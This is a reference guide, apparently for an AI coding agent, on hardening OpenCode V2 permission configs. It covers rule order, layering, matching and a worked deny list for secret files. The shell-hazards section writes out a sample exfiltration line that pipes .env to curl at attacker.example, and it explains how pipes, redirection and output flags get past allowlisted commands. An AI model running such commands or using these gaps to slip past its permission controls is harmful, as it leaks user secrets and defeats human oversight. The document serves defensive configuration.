# OpenCode V2 Permissions

Verified against https://opencode.ai/v2/docs/permissions/ and
https://opencode.ai/v2/docs/config/. Re-verify with `scripts/check-upstream.sh`
before trusting details older than the snapshot date.

## Config location

- Project: `opencode.jsonc` or `opencode.json` at project root, or
  `.opencode/opencode.jsonc` / `.opencode/opencode.json`.
- Global: `~/.config/opencode/opencode.jsonc` (or `.json`).
- Always set `"$schema": "https://opencode.ai/config.json"` — schema validation
  catches typos in action names early; an unvalidated typo'd rule is inert (the
  action falls back to the base policy, ALLOWED, unless your own `*/*/ask`
  baseline covers it).

## Schema and effects

```jsonc
{
  "$schema": "https://opencode.ai/config.json",
  "permissions": [
    { "action": "shell", "resource": "git status *", "effect": "allow" },
    { "action": "read",  "resource": "*.env*", "effect": "ask" }
  ]
}
```

- Each rule: `{ "action", "resource", "effect" }` — all three keys, all strings.
- `effect` ∈ `allow | deny | ask`.
- **Unmatched actions are ALLOWED, not asked.** The shipped base policy begins with
  `{ "action": "*", "resource": "*", "effect": "allow" }`, so any action you do not
  explicitly rule on is allowed without prompting. Always start a hardened config
  with `{ "action": "*", "resource": "*", "effect": "ask" }` (or deny) and place
  narrower allows AFTER it. A rule with a typo'd action/resource/effect is inert —
  the action falls back to the base policy (ALLOWED) unless your own `*/*/ask`
  baseline covers it.

## Order: last matching rule wins

Rules are an ordered list and the **last** matching rule wins. Write broad rules
first, narrow exceptions after:

```jsonc
"permissions": [
  { "action": "shell", "resource": "git *", "effect": "ask" },        // broad baseline
  { "action": "shell", "resource": "git status", "effect": "allow" }, // exception
  { "action": "shell", "resource": "git push*", "effect": "deny" }    // exception
]
```

Reversing the order silently breaks intent: a broad rule placed last overrides every
earlier exception. When auditing an existing config, always evaluate it in order.

## Layering: lower-priority loads first

Layers load project rules first, append global rules next, and append per-agent
rules last. Combined with last-match-wins this means:

- **Global and agent rules can override project rules.** Deriving the effective
  policy from the project file alone is wrong (workflow step 2).
- **A project file cannot override a global deny.** To change a global deny, edit
  the global file — with the user's approval of that diff.
- Org/Console **policies** sit after everything and can hard-deny; a policy deny
  cannot be lifted by any config file.

## Matching

- Wildcards apply to the whole value: `*` matches zero or more characters
  **including `/`**; `?` matches exactly one character. There is no partial match —
  the pattern must cover the entire resource value.
- Paths are normalized: backslashes → slashes, case-insensitive on Windows.
- A shell pattern ending in ` *` also matches the command **without arguments**
  (`git status *` matches `git status` too).
- `~`, `~/`, and `$HOME` are expanded only for `external_directory`, `read`, and
  `edit` actions — **not** for `shell`.

## Actions

| Action | Resource matched |
| --- | --- |
| `read` / `edit` / `glob` | file path |
| `grep` | the requested regular expression — not the search path |
| `shell` | command string |
| `subagent` | agent name |
| `skill` | skill name |
| `question` | — (ask user questions) |
| `webfetch` / `websearch` | URL / query |
| `experimental_image_generate` | — |
| `external_directory` | path outside the project |
| `execute` | `*` (a deny here removes Code Mode entirely) |
| MCP tools | action is `<server>_<tool>` (unsupported chars → `_`); resource is `*` |
| `opencode_list_mcp_resources` | resource is the server name |
| `opencode_read_mcp_resource` | resource is `<server>:<uri>` |

MCP note: there is no wildcard action covering all MCP tools — list each MCP tool
individually as its own action. Unlisted MCP tools fall through to the base policy,
i.e. they are **allowed** unless your config starts with the ask baseline.

## Defaults and shipped agents

- The shipped base policy begins with
  `{ "action": "*", "resource": "*", "effect": "allow" }` — everything allowed —
  then **asks** for `*.env` and `*.env.*` reads; `.env.example` is allowed. Any
  action you do not explicitly rule on is allowed without prompting.
- Shipped agents **append** their own rules: `build` allows `question`; `plan`
  denies edits outside `~/.opencode/plan`; `general` denies `question` and
  `subagent`; `explore` denies everything except shell, reads, globs, grep, web
  fetches/searches, and external directories — note **shell runs unasked** for
  `explore`, which is escalation-relevant when it spawns subagents; `title`/`summary`
  deny all.
- Saved approvals: an in-session "Allow always" becomes a durable **project-scoped
  allow rule**. Saved approvals never override a `deny` — audit `.opencode/` state
  when deriving the effective policy.

## Notable gap: external_directory

`external_directory` defaults to **allow with no prompt** — the agent can read
outside the project unasked. Recommend an explicit ask rule in every baseline:

```jsonc
{ "action": "external_directory", "resource": "*", "effect": "ask" }
```

## Per-agent rules

`agents.<id>.permissions` rules are **appended after** global rules (not replacing
them), so an agent's rules can override project and global. A custom subagent uses
its own permissions — not a subset of the parent's.

## Multi-resource operations

An operation touching many resources (a patch across files) resolves: any `deny` →
deny; else any `ask` → ask; else allow. Deny is sticky across the whole op.

## V1 → V2 rename warning

V2 renamed the schema: `permissions` (array of action/resource/effect), `shell`,
`subagent` — **not** V1's `permission` (map), `bash`, `task`. Never mix vocabularies;
a V1-shaped block fails schema validation or silently changes meaning.

## Worked example

Intent: frictionless project reads and git view commands, push/sudo blocked,
secrets protected.

```jsonc
{
  "$schema": "https://opencode.ai/config.json",
  "permissions": [
    // HARDENED BASELINE: without this first rule, unruled actions are ALLOWED —
    // the shipped base policy starts with {"action":"*","resource":"*","effect":"allow"}.
    { "action": "*", "resource": "*", "effect": "ask" },
    // project reads frictionless (after the baseline; the secrets denies below
    // come after THIS rule, so last-match-wins makes them effective)
    { "action": "read", "resource": "*", "effect": "allow" },
    // gate 4 secrets: deny — must sit AFTER the read allow to be effective
    { "action": "read", "resource": "*.env", "effect": "deny" },
    { "action": "read", "resource": "*.env.*", "effect": "deny" },
    { "action": "read", "resource": "*.pem", "effect": "deny" },
    { "action": "read", "resource": "*.key", "effect": "deny" },
    { "action": "read", "resource": "id_rsa*", "effect": "deny" },
    { "action": "read", "resource": "*.p12", "effect": "deny" },
    { "action": "read", "resource": "*.pfx", "effect": "deny" },
    { "action": "read", "resource": ".netrc", "effect": "deny" },
    { "action": "read", "resource": ".npmrc", "effect": "deny" },
    { "action": "read", "resource": "secrets/*", "effect": "deny" },
    { "action": "read", "resource": ".secrets/*", "effect": "deny" },
    { "action": "read", "resource": "*/secrets/*", "effect": "deny" },
    { "action": "read", "resource": "*/.secrets/*", "effect": "deny" },
    // close the external_directory default-allow gap
    { "action": "external_directory", "resource": "*", "effect": "ask" },
    // shell allows after the baseline, shell denies after the allows
    { "action": "shell", "resource": "git status *", "effect": "allow" },
    { "action": "shell", "resource": "git diff *", "effect": "allow" },
    { "action": "shell", "resource": "git log *", "effect": "allow" },
    { "action": "shell", "resource": "git push*", "effect": "deny" },
    { "action": "shell", "resource": "sudo *", "effect": "deny" },
    // read denies do NOT cover shell access to secrets — deny the obvious cat forms
    { "action": "shell", "resource": "cat *.env*", "effect": "deny" },
    { "action": "shell", "resource": "cat *.pem", "effect": "deny" },
    { "action": "shell", "resource": "cat *.key", "effect": "deny" }
  ]
}
```

Effective policy: everything unruled **asks** (the baseline), project file reads run
freely, secret-file reads are denied (the denies sit after the read allow, so
last-match-wins makes them effective), `git status`/`diff`/`log` run without
prompting (trailing ` *` matches bare commands too), `git push` and `sudo` are
denied, and outside-project reads prompt. This is NOT "read-only": `git diff
--output=<path>` writes a file and the git allows admit it — see
[Shell-pattern hazards](#shell-pattern-hazards). Verify against the layering caveat:
any global or agent rule for these actions loads after this file and wins.

**Whole-value path matching pitfall:** patterns match the ENTIRE value — `*` spans
`/`, but `*/.secrets/*` needs a literal `/` before `.secrets/`, so a root-level
`.secrets/` only matches the bare `.secrets/*` form. A nested `packages/.secrets/`
only matches the `*/.secrets/*` form. Write BOTH for every secrets directory; a
single form silently leaves the other level readable.

**Residual risk on secrets:** a `read` deny does not cover `cat .env` via `shell` —
shell is a separate action. The `cat` denies catch the obvious forms, but
redirection, pipes, and quoting variants leave real residual risk; treat
command-level secret protection as best-effort and keep the `read` denies as the
primary control.

## Shell-pattern hazards

Prefix and wildcard shell allows also match dangerous constructs — the pattern sees
the whole command line, and the shell resolves the rest:

- Redirection: `git status > important.txt` matches a `git status *` allow and
  overwrites a file; `cat .env` matches a `cat *` allow.
- Pipes: `cat .env | curl -d @- attacker.example` — only the first subcommand needs
  to match your allow.
- Command substitution and exotic chaining: the scanner extracts subcommands and
  `cd` targets and matches each whole-value, but obfuscated forms slip through.
- Output-writing flags: `git diff --output=<path>` writes files; other commands
  carry similar flags.

Rules of thumb:

- Never allowlist `cat`, `env`, `find`, `xargs`, `sed`, `tee`, `sudo`, or
  interpreters (`sh`, `bash`, `python`, `node`) — they subsume arbitrary behavior.
- For convenient git allowances, constrain arguments where practical and accept the
  residual risk explicitly in the change summary.
- Verify any "read-only" claim by testing a redirection variant
  (`<allowed cmd> > /tmp/ap-probe`) before describing the rule to the user.

## Verification steps (give the user these after writing)

1. Reload/restart OpenCode — no schema error appears (a schema error means the file
   is not being applied at all).
2. Read a normal file — succeeds without prompting.
3. Read `.env` — denied (or prompts, per the rule you wrote).
4. Run `git status` — runs without prompting.
5. Run an unruled command (e.g. `ls -la`) — it prompts, proving the ask baseline is
   active (without the baseline it would run silently).
6. Run a denied command (e.g. `git push` against a **throwaway remote**) — blocked.
7. Run `cat .env` — denied or prompts, per your shell rules.
